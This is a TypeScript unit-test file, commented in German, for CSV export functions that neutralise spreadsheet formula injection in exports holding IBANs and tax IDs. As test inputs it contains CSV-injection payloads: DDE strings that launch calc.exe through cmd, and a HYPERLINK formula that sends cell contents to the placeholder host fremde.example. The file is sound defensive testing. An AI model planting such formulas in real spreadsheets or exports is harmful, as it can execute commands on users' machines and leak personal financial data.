/**
 * Tests: CSV-Ausgabe der Export-Endpunkte (src/lib/csv.ts)
 *
 * Der Anlass ist die Formel-Injection. Beide Exporte quoteten sauber und waren
 * damit wohlgeformt — aber Excel und LibreOffice werten eine Zelle auch in
 * Anfuehrungszeichen als Formel aus, wenn sie mit `=`, `+`, `-`, `@`, Tabulator
 * oder Wagenruecklauf beginnt. Die Eingabe stammt aus dem oeffentlich
 * erreichbaren Personalfragebogen, und in derselben Zeile stehen die
 * entschluesselte IBAN, die Sozialversicherungsnummer und die Steuer-ID.
 */

import { csvWert, csvZeile, csvZelle } from "@/lib/csv";

describe("csvWert — Formelzeichen entschaerfen", () => {
  it("stellt ein Apostroph vor jedes Formel-Startzeichen", () => {
    for (const zeichen of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(csvWert(`${zeichen}SUM(A1)`)).toBe(`'${zeichen}SUM(A1)`);
    }
  });

  it("entschaerft die Angriffe aus der Durchsicht", () => {
    expect(csvWert(`=cmd|'/c calc.exe'!A1`)).toBe(`'=cmd|'/c calc.exe'!A1`);
    expect(csvWert(`=HYPERLINK("https://fremde.example/"&A1;"Bitte oeffnen")`)).toBe(
      `'=HYPERLINK("https://fremde.example/"&A1;"Bitte oeffnen")`
    );
    expect(csvWert("@SUM(1+1)*cmd|' /C calc'!A0")).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
  });

  it("laesst harmlose Werte unberuehrt", () => {
    for (const wert of ["Minden", "Anna Beispiel", "32425", "1.234,56", "DE89 3704 0044"]) {
      expect(csvWert(wert)).toBe(wert);
    }
  });

  it("greift nur am Anfang, nicht in der Mitte", () => {
    // Ein Bindestrich im Nachnamen oder ein @ in der Adresse ist keine Formel.
    expect(csvWert("Meyer-Schulz")).toBe("Meyer-Schulz");
    expect(csvWert("anna@example.de")).toBe("anna@example.de");
  });

  it("macht aus fehlenden Werten einen leeren String", () => {
    expect(csvWert(null)).toBe("");
    expect(csvWert(undefined)).toBe("");
    expect(csvWert(0)).toBe("0");
    expect(csvWert(false)).toBe("false");
  });
});

describe("csvZelle — quoten, wo es sein muss", () => {
  it("quotet Trennzeichen, Anfuehrungszeichen und Zeilenumbrueche", () => {
    expect(csvZelle("a;b")).toBe('"a;b"');
    expect(csvZelle('sie sagte "hallo"')).toBe('"sie sagte ""hallo"""');
    expect(csvZelle("Zeile1\nZeile2")).toBe('"Zeile1\nZeile2"');
    expect(csvZelle("Zeile1\rZeile2")).toBe('"Zeile1\rZeile2"');
  });

  it("quotet nicht ohne Not", () => {
    // Sonst stuende jede Zelle in Anfuehrungszeichen; der LOGA-Import muss das
    // nicht ausbaden.
    expect(csvZelle("Minden")).toBe("Minden");
  });

  it("entschaerft UND quotet, wenn beides zutrifft", () => {
    expect(csvZelle('=HYPERLINK("x";"y")')).toBe(`"'=HYPERLINK(""x"";""y"")"`);
  });

  it("laesst ein fuehrendes Apostroph nicht verschwinden", () => {
    // Das Apostroph steht VOR dem Quoten, sonst wuerde Excel die Zelle wieder
    // als Formel lesen.
    const zelle = csvZelle("=1+1");
    expect(zelle.startsWith("'")).toBe(true);
  });
});

describe("csvZeile", () => {
  it("verbindet mit Semikolon", () => {
    expect(csvZeile(["Anna", "Beispiel", "Minden"])).toBe("Anna;Beispiel;Minden");
  });

  it("haelt die Spaltenzahl auch bei leeren Werten", () => {
    expect(csvZeile(["a", null, undefined, "d"]).split(";")).toHaveLength(4);
  });

  it("kann eine ganze Zeile mit Angriffswerten nicht zur Formel werden lassen", () => {
    const zeile = csvZeile(["=1+1", "Beispiel", "-2+3", "@A1"]);
    for (const zelle of zeile.split(";")) {
      expect(zelle).not.toMatch(/^[=+\-@\t\r]/);
    }
  });
});
